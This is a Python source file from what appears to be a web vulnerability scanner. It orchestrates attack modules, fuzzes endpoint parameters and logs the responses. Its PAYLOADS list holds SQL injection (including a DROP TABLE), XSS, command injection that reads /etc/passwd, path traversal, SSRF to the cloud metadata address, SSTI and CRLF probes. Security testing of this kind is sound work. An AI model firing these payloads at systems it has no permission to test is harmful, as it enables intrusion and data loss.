"""
attack.py — Attack orchestration layer.

Flow:
  AppMap
    │
    ▼
  ModuleRunner.run_all(app_map)
    │  ┌─ for each endpoint → build entrypoint dict
    │  └─ for each module   → module.run(entrypoint) → findings
    ▼
  List[Finding]  (passed to Analyzer / Reporter)

Also exposes the legacy AttackGenerator + RequestSender classes
so that scanner.py doesn't need changes for backward-compatibility.
"""

import asyncio
import copy
import datetime
import json
import logging
import time as _time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode

import aiohttp

from my_scan.models import AppMap, Endpoint, AttackLogEntry, Vulnerability
from my_scan.session import SessionController
from my_scan.modules import ALL_MODULES
from my_scan.modules.base import BaseModule

logger = logging.getLogger("AttackModule")


# ---------------------------------------------------------------------------
# Legacy PAYLOADS dict (kept for backward-compat with any external references)
# ---------------------------------------------------------------------------
PAYLOADS: Dict[str, List[str]] = {
    "sqli": [
        "'", "''", "1' OR '1'='1", "1' AND 1=2 --",
        "1; DROP TABLE users--", "' UNION SELECT NULL,NULL--", "1' AND SLEEP(5)--",
    ],
    "xss": [
        "<script>alert(1)</script>", '"><script>alert(1)</script>',
        "';alert(1)//", "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>", "javascript:alert(1)",
    ],
    "cmdi": ["; id", "| id", "`id`", "$(id)", "; cat /etc/passwd", "| whoami"],
    "path_traversal": [
        "../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//etc/passwd",
    ],
    "ssrf": [
        "http://127.0.0.1/",
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8080/",
    ],
    "open_redirect": [
        "//evil.example.com/",
        "https://evil.example.com/",
    ],
    "ssti": ["{{7*7}}", "${7*7}", "<%=7*7%>"],
    "crlf": [
        "value\r\nX-Injected: yes",
        "value%0d%0aX-Injected:%20yes",
    ],
}


# ---------------------------------------------------------------------------
# ModuleRunner — new modular engine
# ---------------------------------------------------------------------------
class ModuleRunner:
    """
    Runs all loaded attack modules against every endpoint in an AppMap.
    Returns a unified list of finding dicts (compatible with Classifier).
    """

    def __init__(
        self,
        session_controller: SessionController,
        log_file: str = "attack_log.jsonl",
        concurrency: int = 6,
        timeout: int = 12,
        proxy: Optional[str] = None,
    ):
        self.session_controller = session_controller
        self.log_file   = log_file
        self.concurrency = concurrency
        self.timeout    = timeout
        self.proxy      = proxy
        self.vectors_sent = 0

    async def run_all(
        self, app_map: AppMap
    ) -> Tuple[List[Dict[str, Any]], List[Vulnerability]]:
        """
        Returns (raw_results_for_legacy_analyzer, vulnerabilities_from_modules).
        raw_results list is kept for backward-compat with ResponseAnalyzer.
        """
        raw_results:     List[Dict[str, Any]] = []
        module_vulns:    List[Vulnerability]  = []

        cookie_jar = aiohttp.CookieJar(unsafe=True)
        for name, value in self.session_controller.cookies.items():
            cookie_jar.update_cookies({name: value})

        base_headers: Dict[str, str] = {}
        base_headers.update(self.session_controller.auth_headers)

        connector = aiohttp.TCPConnector(ssl=False)
        timeout_cfg = aiohttp.ClientTimeout(total=self.timeout)

        sem = asyncio.Semaphore(self.concurrency)

        async with aiohttp.ClientSession(
            cookie_jar=cookie_jar,
            headers=base_headers,
            connector=connector,
            timeout=timeout_cfg,
        ) as http_session:
    
            if self.proxy:
                http_session._default_proxy = self.proxy
            # 1. Measure baseline latency for all endpoints
            async def measure_baseline(ep: Dict[str, Any]) -> float:
                t0 = _time.monotonic()
                try:
                    async with http_session.request(
                        method=ep.get("method", "GET"),
                        url=ep["url"],
                        params=ep.get("params"),
                        data=ep.get("body"),
                        timeout=5
                    ) as resp:
                        await resp.read()
                except Exception:
                    pass
                return max(0.1, _time.monotonic() - t0)

            baselines = {}
            for key, endpoint in app_map.nodes.items():
                ep_dict = self._endpoint_to_entrypoint(endpoint)
                baselines[key] = asyncio.ensure_future(measure_baseline(ep_dict))
            
            if baselines:
                await asyncio.wait(baselines.values())

            # 2. Run modules with baseline injected
            tasks = []
            for key, endpoint in app_map.nodes.items():
                entrypoint = self._endpoint_to_entrypoint(endpoint)
                entrypoint["_baseline_latency"] = baselines[key].result() if baselines[key].done() else 1.0
                for ModuleClass in ALL_MODULES:
                    tasks.append(
                        self._run_module(sem, http_session, ModuleClass, entrypoint, endpoint)
                    )

            results = await asyncio.gather(*tasks, return_exceptions=True)

        with open(self.log_file, "a", encoding="utf-8") as lf:
            for r in results:
                if isinstance(r, list):
                    for finding in r:
                        vuln = self._finding_to_vulnerability(finding)
                        module_vulns.append(vuln)
                        # Write to log
                        lf.write(json.dumps({
                            "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
                            "vuln_type": finding.get("vuln_id", "unknown"),
                            "method": finding.get("method", ""),
                            "url": finding.get("url", ""),
                            "parameter": finding.get("parameter", ""),
                            "location": "body",
                            "payload": finding.get("payload", ""),
                            "mutated_url": finding.get("url", ""),
                            "request_headers": {},
                            "request_body": None,
                            "response_status": 0,
                            "response_latency_ms": 0,
                            "response_body_snippet": finding.get("evidence", ""),
                            "anomaly_detected": True,
                            "anomaly_detail": finding.get("evidence", ""),
                        }, ensure_ascii=False) + "\n")
                elif isinstance(r, Exception):
                    logger.debug(f"Module task exception: {r}")

        self.vectors_sent = len(tasks)
        return raw_results, module_vulns

    async def _run_module(
        self,
        sem: asyncio.Semaphore,
        http_session: aiohttp.ClientSession,
        ModuleClass: type,
        entrypoint: Dict[str, Any],
        endpoint: Endpoint,
    ) -> List[Dict[str, Any]]:
        async with sem:
            try:
                module = ModuleClass(session=http_session)
                findings = await module.run(entrypoint)
                for f in findings:
                    logger.warning(
                        f"  [!] {f['severity'].upper()} — {f['vuln_id']} "
                        f"| {f['method']} {f['url']} "
                        f"| param='{f['parameter']}' "
                        f"| payload={repr(f['payload'][:60])}"
                    )
                return findings
            except Exception as exc:
                logger.debug(f"[{ModuleClass.name}] error on {endpoint.url}: {exc}")
                return []

    @staticmethod
    def _endpoint_to_entrypoint(ep: Endpoint) -> Dict[str, Any]:
        """Convert an Endpoint model to the dict format expected by modules."""
        params: Dict[str, str] = {}
        # Parse URL query params
        parsed = urlparse(ep.url)
        if parsed.query:
            for k, vs in parse_qs(parsed.query).items():
                params[k] = vs[0]
        # Merge endpoint.params
        if ep.params:
            params.update(ep.params)

        return {
            "url":     ep.url,
            "method":  ep.method,
            "params":  params or None,
            "body":    ep.body,
            "headers": dict(ep.headers) if ep.headers else {},
        }

    @staticmethod
    def _finding_to_vulnerability(f: Dict[str, Any]) -> Vulnerability:
        return Vulnerability(
            vulnerability_type=f.get("vuln_id", "unknown"),
            severity=f.get("severity", "Medium"),
            url=f.get("url", ""),
            method=f.get("method", "GET"),
            parameter=f.get("parameter", ""),
            payload=f.get("payload", ""),
            evidence=f.get("evidence", ""),
            description=(
                f"The parameter '{f.get('parameter', '')}' in "
                f"{f.get('method', 'GET')} {f.get('url', '')} "
                f"appears vulnerable to {f.get('vulnerability', '').upper()}. "
                f"{f.get('evidence', '')}"
            ),
        )


# ---------------------------------------------------------------------------
# Legacy AttackGenerator (still used by scanner.py Phase 2 / RequestSender)
# ---------------------------------------------------------------------------
class AttackGenerator:
    """
    Generates flat attack vectors for the legacy RequestSender pipeline.
    Now includes all payload types from the PAYLOADS dict above.
    """

    def __init__(self, vuln_types: Optional[List[str]] = None):
        self.vuln_types = vuln_types or list(PAYLOADS.keys())

    def generate_vectors(self, app_map: AppMap) -> List[Dict[str, Any]]:
        vectors: List[Dict[str, Any]] = []

        for key, endpoint in app_map.nodes.items():
            vectors_generated = False

            # Query / path parameters
            if endpoint.params:
                for param in endpoint.params:
                    for vtype in self.vuln_types:
                        for payload in PAYLOADS.get(vtype, []):
                            vectors.append({
                                "endpoint":  endpoint,
                                "type":      vtype,
                                "parameter": param,
                                "location":  "query",
                                "payload":   payload,
                            })
                            vectors_generated = True

            # Body parameters (JSON or form-encoded)
            if endpoint.body:
                body_params = self._parse_body(endpoint.body)
                for param in body_params:
                    for vtype in self.vuln_types:
                        for payload in PAYLOADS.get(vtype, []):
                            loc = self._body_format(endpoint.body)
                            vectors.append({
                                "endpoint":  endpoint,
                                "type":      vtype,
                                "parameter": param,
                                "location":  loc,
                                "payload":   payload,
                            })
                            vectors_generated = True

            # Fallback: common param fuzzing
            if not vectors_generated and endpoint.method in ("GET", "POST", "PUT"):
                common_params = [
                    "id", "username", "password", "q", "search",
                    "email", "userid", "query", "url", "redirect",
                    "file", "path", "cmd", "exec", "input",
                ]
                for param in common_params:
                    for vtype in self.vuln_types:
                        for payload in PAYLOADS.get(vtype, []):
                            vectors.append({
                                "endpoint":  endpoint,
                                "type":      vtype,
                                "parameter": param,
                                "location":  "query" if endpoint.method == "GET" else "json",
                                "payload":   payload,
                            })

        logger.info(f"[AttackGenerator] Generated {len(vectors)} legacy attack vectors")
        return vectors

    @staticmethod
    def _parse_body(body: str) -> List[str]:
        try:
            d = json.loads(body)
            if isinstance(d, dict):
                return list(d.keys())
        except (json.JSONDecodeError, TypeError):
            pass
        try:
            return list(parse_qs(body).keys())
        except Exception:
            return []

    @staticmethod
    def _body_format(body: str) -> str:
        try:
            json.loads(body)
            return "body_json"
        except (json.JSONDecodeError, TypeError):
            return "body_form"


# ---------------------------------------------------------------------------
# DataParser (payload injection helper)
# ---------------------------------------------------------------------------
class DataParser:
    """Mutates a request by embedding a payload into the right location."""

    @staticmethod
    def inject_vector(
        endpoint: Endpoint,
        parameter: str,
        location: str,
        payload: str,
    ) -> Tuple[str, Dict[str, str], Optional[str]]:
        headers     = copy.deepcopy(endpoint.headers)
        mutated_url  = endpoint.url
        mutated_body = endpoint.body

        if location == "query":
            parsed = urlparse(endpoint.url)
            qp = {k: v[0] for k, v in parse_qs(parsed.query).items()}
            qp.update(endpoint.params)
            qp[parameter] = payload
            new_q = urlencode(qp)
            mutated_url = parsed._replace(query=new_q).geturl()

        elif location == "body_json" and endpoint.body:
            try:
                bd = json.loads(endpoint.body)
                if isinstance(bd, dict):
                    bd[parameter] = payload
                    mutated_body = json.dumps(bd)
                    headers["Content-Type"] = "application/json"
            except Exception as e:
                logger.debug(f"JSON injection error: {e}")

        elif location == "body_form" and endpoint.body:
            try:
                bd = {k: v[0] for k, v in parse_qs(endpoint.body).items()}
                bd[parameter] = payload
                mutated_body = urlencode(bd)
                headers["Content-Type"] = "application/x-www-form-urlencoded"
            except Exception as e:
                logger.debug(f"Form injection error: {e}")

        elif location == "json":
            # Fallback fuzzing with JSON body
            try:
                bd = json.loads(endpoint.body or "{}")
                if isinstance(bd, dict):
                    bd[parameter] = payload
                    mutated_body = json.dumps(bd)
                else:
                    mutated_body = json.dumps({parameter: payload})
            except Exception:
                mutated_body = json.dumps({parameter: payload})
            headers["Content-Type"] = "application/json"

        return mutated_url, headers, mutated_body


# ---------------------------------------------------------------------------
# RequestSender (legacy, kept for scanner.py compatibility)
# ---------------------------------------------------------------------------
class RequestSender:
    """
    Sends attack vectors asynchronously and writes each result to
    attack_log.jsonl in real-time.
    """

    def __init__(
        self,
        session_controller: SessionController,
        concurrency_limit: int = 8,
        log_file: str = "attack_log.jsonl",
        timeout: int = 10,
        proxy: Optional[str] = None,
    ):
        self.session_controller = session_controller
        self.semaphore  = asyncio.Semaphore(concurrency_limit)
        self.log_file   = log_file
        self.timeout    = timeout
        self.proxy      = proxy
        self._log_fh    = None
        self.vectors_sent = 0

    async def execute_queue(
        self, vectors: List[Dict[str, Any]]
    ) -> List[Dict[str, Any]]:
        results: List[Dict[str, Any]] = []

        base_headers: Dict[str, str] = {}
        base_headers.update(self.session_controller.auth_headers)

        cookie_jar = aiohttp.CookieJar(unsafe=True)
        for name, value in self.session_controller.cookies.items():
            cookie_jar.update_cookies({name: value})

        with open(self.log_file, "a", encoding="utf-8") as log_fh:
            self._log_fh = log_fh
            conn = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(
                cookie_jar=cookie_jar,
                headers=base_headers,
                connector=conn,
            ) as session:
                tasks = [self._send_vector(session, vec) for vec in vectors]
                raw_results = await asyncio.gather(*tasks, return_exceptions=True)

            for r in raw_results:
                if isinstance(r, dict):
                    results.append(r)
                elif isinstance(r, Exception):
                    logger.debug(f"Vector exception: {r}")

        self._log_fh = None
        self.vectors_sent += len(vectors)
        logger.info(
            f"[RequestSender] Sent {len(vectors)} vectors → "
            f"{len(results)} responses recorded"
        )
        return results

    async def _send_vector(
        self, session: aiohttp.ClientSession, vector: Dict[str, Any]
    ) -> Optional[Dict[str, Any]]:
        endpoint: Endpoint = vector["endpoint"]
        parameter: str     = vector["parameter"]
        location: str      = vector["location"]
        payload: str       = vector["payload"]
        vtype: str         = vector["type"]

        mutated_url, headers, mutated_body = DataParser.inject_vector(
            endpoint, parameter, location, payload
        )

        async with self.semaphore:
            ts = datetime.datetime.now(datetime.timezone.utc).isoformat() + "Z"
            t0 = _time.monotonic()

            try:
                method = endpoint.method.upper()
                req_kwargs: Dict[str, Any] = {
                    "headers": headers,
                    "timeout": aiohttp.ClientTimeout(total=self.timeout),
                }
                if self.proxy:
                    req_kwargs["proxy"] = self.proxy
                if method == "GET":
                    resp_ctx = session.get(mutated_url, **req_kwargs)
                else:
                    req_kwargs["data"] = mutated_body
                    resp_ctx = session.request(method, mutated_url, **req_kwargs)

                async with resp_ctx as resp:
                    body_text  = await resp.text(errors="replace")
                    latency_ms = (_time.monotonic() - t0) * 1000

                    raw_result = {
                        "vector":      vector,
                        "status":      resp.status,
                        "headers":     dict(resp.headers),
                        "body":        body_text,
                        "latency_ms":  latency_ms,
                        "latency":     latency_ms / 1000,
                        "mutated_url": mutated_url,
                        "timestamp":   ts,
                    }

                    self._write_log_entry(
                        ts, vtype, method, endpoint.url, parameter, location,
                        payload, mutated_url, headers, mutated_body,
                        resp.status, latency_ms, body_text,
                    )
                    return raw_result

            except asyncio.TimeoutError:
                logger.debug(f"Timeout: {endpoint.method} {mutated_url}")
                self._write_log_entry(
                    ts, vtype, endpoint.method.upper(), endpoint.url,
                    parameter, location, payload, mutated_url, headers,
                    mutated_body, -1, (_time.monotonic() - t0) * 1000, "TIMEOUT",
                )
                return None
            except Exception as e:
                logger.debug(f"Request error: {e}")
                return None

    def _write_log_entry(
        self,
        ts, vtype, method, url, parameter, location, payload,
        mutated_url, req_headers, req_body, status, latency_ms, body_text,
        anomaly=False, anomaly_detail=None,
    ):
        if not self._log_fh:
            return
        entry = AttackLogEntry(
            timestamp=ts, phase="fuzzing", vuln_type=vtype,
            method=method, url=url, parameter=parameter,
            location=location, payload=payload,
            mutated_url=mutated_url,
            request_headers={k: v for k, v in req_headers.items()},
            request_body=req_body,
            response_status=status,
            response_latency_ms=latency_ms,
            response_body_snippet=body_text[:500],
            anomaly_detected=anomaly,
            anomaly_detail=anomaly_detail,
        )
        try:
            self._log_fh.write(json.dumps(entry.to_dict(), ensure_ascii=False) + "\n")
            self._log_fh.flush()
        except Exception as e:
            logger.debug(f"Log write error: {e}")
